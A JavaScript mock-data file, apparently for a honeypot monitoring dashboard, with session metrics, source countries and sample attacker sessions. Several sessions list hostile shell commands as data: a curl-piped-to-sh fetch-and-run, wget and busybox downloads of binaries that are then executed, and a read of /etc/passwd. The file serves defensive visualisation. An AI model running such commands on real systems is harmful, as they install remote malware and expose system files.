export const mockOverview = {
  generatedAt: '2026-07-26T11:42:00Z',
  metrics: [
    { label: 'Observed sessions', value: '1,284', change: '+18.4%', tone: 'blue', icon: '◫' },
    { label: 'Active now', value: '12', change: '3 new this hour', tone: 'green', icon: '◉' },
    { label: 'High-risk sessions', value: '47', change: '3.7% of total', tone: 'coral', icon: '▲' },
    { label: 'Source countries', value: '31', change: '+4 this week', tone: 'violet', icon: '◎' },
  ],
  geography: [
    { country: 'India', code: 'IN', sessions: 248, color: '#46a7ff' },
    { country: 'United States', code: 'US', sessions: 194, color: '#7a72ff' },
    { country: 'Brazil', code: 'BR', sessions: 149, color: '#f5a74d' },
    { country: 'Germany', code: 'DE', sessions: 126, color: '#6fd6aa' },
    { country: 'Vietnam', code: 'VN', sessions: 93, color: '#ef7d84' },
  ],
}

export const mockTimeline = [
  { time: '00:00', sessions: 21, anomalies: 1 },
  { time: '02:00', sessions: 34, anomalies: 2 },
  { time: '04:00', sessions: 25, anomalies: 0 },
  { time: '06:00', sessions: 53, anomalies: 4 },
  { time: '08:00', sessions: 43, anomalies: 3 },
  { time: '10:00', sessions: 76, anomalies: 5 },
  { time: '12:00', sessions: 61, anomalies: 2 },
  { time: '14:00', sessions: 89, anomalies: 8 },
  { time: '16:00', sessions: 56, anomalies: 3 },
  { time: '18:00', sessions: 72, anomalies: 6 },
  { time: '20:00', sessions: 48, anomalies: 2 },
  { time: '22:00', sessions: 38, anomalies: 1 },
]

export const mockSessions = [
  {
    id: 'e6f0a2bd', ip: '185.220.101.42', country: 'Germany', flag: 'DE', city: 'Frankfurt',
    startedAt: '2026-07-26T11:38:11Z', duration: '14m 22s', commands: ['uname -a', 'id', 'curl 45.131.65.14/p.sh | sh'],
    severity: 'Critical', score: 0.94, archetype: 'Post-exploitation', status: 'Closed', protocol: 'SSH', username: 'root',
  },
  {
    id: '3a81fc7e', ip: '45.148.10.12', country: 'Netherlands', flag: 'NL', city: 'Amsterdam',
    startedAt: '2026-07-26T11:31:49Z', duration: '3m 08s', commands: ['cat /etc/passwd', 'wget http://91.92.240.8/x'],
    severity: 'High', score: 0.81, archetype: 'Credential harvester', status: 'Closed', protocol: 'SSH', username: 'admin',
  },
  {
    id: 'bf920d4a', ip: '103.27.186.7', country: 'India', flag: 'IN', city: 'Mumbai',
    startedAt: '2026-07-26T11:29:02Z', duration: '00m 44s', commands: ['ls', 'exit'],
    severity: 'Low', score: 0.19, archetype: 'Reconnaissance bot', status: 'Closed', protocol: 'SSH', username: 'test',
  },
  {
    id: '71d9e461', ip: '89.248.165.34', country: 'Netherlands', flag: 'NL', city: 'Amsterdam',
    startedAt: '2026-07-26T11:25:38Z', duration: '7m 51s', commands: ['busybox wget http://89.248.165.34/b', 'chmod +x b', './b'],
    severity: 'High', score: 0.78, archetype: 'Malware deployer', status: 'Closed', protocol: 'SSH', username: 'ubuntu',
  },
  {
    id: 'ca04b197', ip: '154.12.67.91', country: 'United States', flag: 'US', city: 'Ashburn',
    startedAt: '2026-07-26T11:19:16Z', duration: '2m 11s', commands: ['whoami', 'pwd', 'ls -la'],
    severity: 'Medium', score: 0.48, archetype: 'Manual probing', status: 'Closed', protocol: 'SSH', username: 'guest',
  },
]

export const mockIntelligence = [
  { label: 'Reconnaissance bot', sessions: 502, share: 39, color: '#47a8ff', description: 'Automated probes with short command sequences.' },
  { label: 'Credential harvester', sessions: 319, share: 25, color: '#8d7cff', description: 'Repeated authentication attempts across common accounts.' },
  { label: 'Manual probing', sessions: 246, share: 19, color: '#efb456', description: 'Interactive reconnaissance and environment checks.' },
  { label: 'Post-exploitation', sessions: 127, share: 10, color: '#ef7f88', description: 'Download, persistence, or lateral-movement behavior.' },
  { label: 'Unclassified', sessions: 90, share: 7, color: '#607182', description: 'Insufficient activity for a confident grouping.' },
]
